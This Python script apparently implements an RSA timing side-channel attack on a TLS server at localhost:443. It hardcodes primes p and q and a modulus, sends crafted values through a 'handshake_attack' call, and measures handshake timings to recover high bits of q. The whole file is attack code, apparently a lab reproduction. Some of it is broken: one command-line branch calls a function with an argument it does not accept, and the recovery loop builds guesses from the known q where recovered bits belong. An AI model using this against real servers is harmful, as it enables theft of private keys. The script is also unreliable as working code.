import sys
import sympy
import socket
import tls
import gc
import pandas


q = sympy.Integer(
    11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283
)
p = sympy.Integer(
    11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789
)
N = sympy.Integer(
    132762152776056020551326919245624484615462467876809681535549565118332290525598572815747323476102181376625279228965473106140757139049665124368186142774966643990206422037551427526013151129106319233128471783533673959766053786798472937188481868923726256436384468384858420931063093337134977283618537887974322079287
)


def sympy_integer_to_bits(integer, byteorder="big"):
    bits = []

    reduced = integer
    while reduced > 0:
        bits.append(reduced % 2)
        reduced = reduced // 2

    if byteorder == "big":
        bits.reverse()

    return bits


def sympy_integer_to_bytes(integer, byteorder="big", length=None):
    bys = []

    reduced = integer
    while reduced > 0:
        bys.append(reduced % 256)
        reduced = reduced // 256

    if length:
        bys = bys + [0] * (length - len(bys))

    if byteorder == "big":
        bys.reverse()

    return bys


def bytes_to_sympy_integer(bys, byteorder="big"):
    num_bytes = len(bys)

    integer = sympy.Integer(0)

    for index, by in enumerate(bys):
        if byteorder == "big":
            power = num_bytes - index - 1
        elif byteorder == "little":
            power = index
        else:
            raise Exception()

        integer += by * 256 ** power

    return integer


def bits_to_sympy_integer(bits, byteorder="big"):
    num_bits = len(bits)

    integer = sympy.Integer(0)

    for index, bit in enumerate(bits):
        if byteorder == "big":
            power = num_bits - index - 1
        elif byteorder == "little":
            power = index
        else:
            raise Exception()

        integer += bit * 2 ** power

    return integer


def reverse_montegomery_transform(g, N):
    R = sympy.Integer(2) ** 512
    R_inverse = sympy.numbers.mod_inverse(R, N)
    u_g = (g * R_inverse) % N
    return u_g


def sample(points, sample_size=7, u_g=False, N=None):
    samples = []

    gc.disable()

    for point in points:
        for iteration in range(sample_size):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("localhost", 443))

            if u_g and N:
                point_to_send = reverse_montegomery_transform(point, N)
            else:
                point_to_send = point

            start_time, response, end_time = tls.handshake_attack(sock, g=point_to_send)
            samples.append((point, end_time - start_time))

            sock.close()

    gc.collect()
    gc.enable()

    return samples


def bruteforce_most_significant_bits(
    num_bits=3,
    min_point=sympy.sympify("2**511"),
    max_point=sympy.sympify("2**512"),
    neighbourhood_size=400,
):
    msb = []
    for i in range(2 ** num_bits):
        i_bits = sympy_integer_to_bits(i)
        i_bits = [0] * (num_bits - len(i_bits)) + i_bits
        msb.append(i_bits)

    gs = [bits + [0] * (512 - num_bits) for bits in msb]
    gs = [bits_to_sympy_integer(g) for g in gs]

    # gs.append(p)
    # gs.append(q)

    gs = [g for g in gs if min_point <= g <= max_point]

    for g in gs.copy():
        gs += [g + i for i in range(1, neighbourhood_size)]

    return gs


def recover_bit(q_bits, i, N, sample_size=7, neighbourhood_size=400):
    num_bits = len(q_bits)

    g_low_bits = q_bits[0:i] + [0] + [0] * (num_bits - (i + 1))
    g_low = bits_to_sympy_integer(g_low_bits)
    g_low_neighbours = [g_low + k for k in range(neighbourhood_size)]

    print(g_low_bits[0:20])

    g_low_samples = sample(g_low_neighbours, sample_size=sample_size, u_g=True, N=N)
    g_low_samples = pandas.DataFrame.from_records(
        g_low_samples, columns=["point", "time"]
    )
    T_g_low = g_low_samples.groupby(by="point").min()["time"].sum()

    g_high_bits = q_bits[0:i] + [1] + [0] * (num_bits - (i + 1))
    g_high = bits_to_sympy_integer(g_high_bits)
    g_high_neighbours = [g_high + k for k in range(neighbourhood_size)]

    print(g_high_bits[0:20])

    g_high_samples = sample(g_high_neighbours, sample_size=sample_size, u_g=True, N=N)
    g_high_samples = pandas.DataFrame.from_records(
        g_high_samples, columns=["point", "time"]
    )
    T_g_high = g_high_samples.groupby(by="point").min()["time"].sum()

    return T_g_low, T_g_high


if __name__ == "__main__":
    if sys.argv[1] == "bruteforce-top-bits":
        print("point time")
        samples = bruteforce_most_significant_bits(sample_size=10, neighbourhood_size=5)
        for point, time in samples:
            print(point, time)

    elif sys.argv[1] == "recover-bits":
        known_bits = [int(b) for b in sys.argv[2]]

        q_bits = sympy_integer_to_bits(q)

        print("# Checking given bits against q")
        for i in range(0, len(known_bits)):
            print(i, q_bits[i], known_bits[i])

        print("\n# Recovering bits iteratively...")
        gaps = []
        T_g_lows = []
        T_g_highs = []
        for i in range(len(known_bits), 20):
            T_g_low, T_g_high = recover_bit(
                q_bits, i, N, sample_size=10, neighbourhood_size=800
            )

            gap = abs(T_g_low - T_g_high)
            gaps.append(gap)

            T_g_lows.append(T_g_low)
            T_g_highs.append(T_g_high)

            print(
                i, q_bits[i], gap, "-" if T_g_low < T_g_high else "+", T_g_low, T_g_high
            )
            print("")

        with open(sys.argv[3], "w") as f:
            for i in range(20 - len(known_bits)):
                f.write(
                    "{} {} {} {} {} {}\n".format(
                        i,
                        q_bits[i],
                        gaps[i],
                        "-" if T_g_lows[i] < T_g_highs[i] else "+",
                        T_g_lows[i],
                        T_g_highs[i],
                    )
                )
